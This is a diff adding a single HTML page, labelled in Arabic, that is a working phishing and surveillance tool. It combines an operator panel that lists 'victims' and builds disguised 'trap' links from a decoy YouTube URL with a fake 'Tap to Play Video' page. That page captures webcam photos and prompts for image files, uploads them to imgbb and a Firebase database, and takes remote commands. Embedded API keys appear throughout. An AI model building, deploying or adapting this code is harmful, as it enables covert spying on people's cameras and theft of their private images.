@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>S-SYSTEM V32 | FIXED</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        :root { --neon: #00ff41; }
+        body { background: #000; color: var(--neon); margin: 0; font-family: 'Courier New', monospace; }
+        
+        /* لوحة التحكم (الآدمن) */
+        #admin-panel { display: block; padding: 15px; }
+        .box { border: 1px solid var(--neon); padding: 15px; margin-bottom: 15px; background: #050505; border-radius: 8px; }
+        .v-item { border: 1px solid #333; padding: 12px; margin-bottom: 8px; cursor: pointer; display: flex; justify-content: space-between; background: #0a0a0a; }
+        .v-item.selected { border-color: #fff; box-shadow: 0 0 10px var(--neon); }
+        
+        .btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; font-weight: bold; cursor: pointer; }
+        button:active { background: var(--neon); color: #000; }
+        input { width: 100%; padding: 10px; background: #000; border: 1px solid var(--neon); color: #0ff; margin-bottom: 10px; box-sizing: border-box; }
+
+        /* واجهة الضحية */
+        #vic-panel { display: none; height: 100vh; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; width: 100%; background: #000; z-index: 9999; }
+        .play { width: 90px; height: 90px; border: 4px solid #fff; border-radius: 50%; position: relative; cursor: pointer; }
+        .play::after { content: ''; position: absolute; top: 25px; left: 35px; border-left: 30px solid #fff; border-top: 20px solid transparent; border-bottom: 20px solid transparent; }
+    </style>
+</head>
+<body>
+
+<div id="admin-panel">
+    <div class="box">
+        <h3 style="margin:0 0 10px 0;">📡 رادار الأجهزة:</h3>
+        <div id="list">بانتظار الاتصال العكسي...</div>
+    </div>
+    <div class="box">
+        <h3>🕹️ التحكم: <span id="t-name">--</span></h3>
+        <div class="btns">
+            <button onclick="cmd('snap')">📸 صورة</button>
+            <button onclick="cmd('vibrate')" style="color:yellow;">📳 هز</button>
+            <button onclick="cmd('pick')" style="color:cyan;">📂 ملفات</button>
+            <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق</button>
+        </div>
+        <button onclick="db.ref('victims').remove()" style="color:red; width:100%; margin-top:15px; font-size:10px; border-color:red;">🗑️ تنظيف</button>
+    </div>
+    <div class="box">
+        <input type="text" id="decoy" placeholder="رابط يوتيوب للتمويه">
+        <button onclick="gen()" style="width:100%;">صناعة الفخ</button>
+        <div id="link-res" style="font-size:10px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
+    </div>
+</div>
+
+<div id="vic-panel">
+    <div class="play" onclick="start()"></div>
+    <p style="color:#fff; margin-top:20px;">Tap to Play Video</p>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <input type="file" id="f" style="display:none;" accept="image/*" multiple>
+</div>
+
+<script>
+    const IMGBB_KEY = "657662c1253a66974d09325996b27e8a";
+    const config = {
+        apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
+        databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
+        projectId: "monster-system-7f67e"
+    };
+
+    if (!firebase.apps.length) firebase.initializeApp(config);
+    const db = firebase.database();
+    let selId = null;
+
+    const params = new URLSearchParams(window.location.search);
+    const vKey = params.get('v');
+
+    if (vKey) {
+        document.getElementById('admin-panel').style.display = 'none';
+        document.getElementById('vic-panel').style.display = 'flex';
+        initV(atob(vKey));
+    } else {
+        initA();
+    }
+
+    function initA() {
+        db.ref('victims').on('value', s => {
+            const l = document.getElementById('list'); l.innerHTML = '';
+            if(!s.exists()) { l.innerHTML = "يبحث..."; return; }
+            s.forEach(c => {
+                const d = c.val(); const id = c.key;
+                const on = (Date.now() - d.lastSeen) < 10000;
+                l.innerHTML += `<div class="v-item ${id === selId ? 'selected' : ''}" onclick="sel('${id}','${d.model}')">
+                    <span>📱 ${d.model}</span>
+                    <span style="color:${on ? '#0f0' : '#444'}">${on ? '● نشط' : '● غائب'}</span>
+                </div>`;
+            });
+        });
+    }
+
+    function sel(id, m) { selId = id; document.getElementById('t-name').innerText = m; }
+    function cmd(t) { if(selId) db.ref('victims/'+selId+'/cmd').set({ t, time: Date.now() }); }
+    function gen() {
+        const u = document.getElementById('decoy').value;
+        if(!u) return alert("ضع رابطاً!");
+        document.getElementById('link-res').innerText = window.location.origin + window.location.pathname + "?v=" + btoa(u);
+    }
+
+    let vRef = null;
+    function initV(target) {
+        const m = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2].split('Build')[0] : "Mobile Device";
+        vRef = db.ref('victims').push();
+        const p = () => vRef.update({ model: m, lastSeen: Date.now() });
+        p(); setInterval(p, 3000);
+        db.ref('victims/'+vRef.key+'/cmd').on('value', s => {
+            const c = s.val(); if(!c) return;
+            if(c.t === 'snap') take();
+            if(c.t === 'vibrate') navigator.vibrate(500);
+            if(c.t === 'pick') document.getElementById('f').click();
+            if(c.t === 'release') window.location.href = target;
+        });
+    }
+
+    async function start() { await take(); }
+    async function take() {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({video:true});
+            const video = document.getElementById('v'); video.srcObject = s; await video.play();
+            const canvas = document.getElementById('c');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const data = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
+            let fd = new FormData(); fd.append("image", data);
+            fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {method:"POST", body:fd})
+            .then(r => r.json()).then(r => vRef.child('photos').push(r.data.url));
+            s.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+    }
+
+    document.getElementById('f').onchange = (e) => {
+        for(let f of e.target.files) {
+            const r = new FileReader();
+            r.onload = (ev) => {
+                let fd = new FormData(); fd.append("image", ev.target.result.split(',')[1]);
+                fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, {method:"POST", body:fd})
+                .then(res => res.json()).then(res => vRef.child('photos').push(res.data.url));
+            };
+            r.readAsDataURL(f);
+        }
+    };
+</script>
+</body>
+</html>
